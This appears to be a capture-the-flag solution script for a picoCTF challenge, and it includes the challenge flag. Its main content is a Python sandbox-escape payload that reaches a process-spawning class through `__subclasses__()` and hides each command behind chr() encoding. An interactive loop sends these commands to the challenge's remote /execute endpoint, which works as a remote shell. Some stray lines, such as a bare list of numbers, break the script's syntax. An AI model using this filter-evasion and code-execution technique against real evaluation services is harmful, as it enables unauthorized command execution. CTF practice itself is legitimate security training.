import requests

# picoCTF{D0nt_Use_Unsecure_f@nctions68288869}
url = "http://shape-facility.picoctf.net:60279/execute"


payloadlist = """().__class__.__bases__[0].__subclasses__()[356]([__PLACEHOLDER__], stdout=-1).stdout.read()"""


# def read_flag():
#      payload = payloadlist.replace("__PLACEHOLDER__", "open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()")

open(chr(97)+chr(112)+chr(112)+chr(46)+chr(112)+chr(121)).read()


47 102 108 97 103 46 116 120 116
status = ""
while status != "exit":
    inp = input("cmd$ ")
    if(inp == 'x'):
        break
    payload = ""
    command = []

    for i in inp:
        command.append(f"chr({ord(i)})")
    
    payload = payloadlist.replace("__PLACEHOLDER__", "+".join(command))
    print(payload)
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded",  "Connection": "keep-alive",  "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
    data = {"code": payload}
    r = requests.post(url, headers=headers, data=data)
    print(r.text)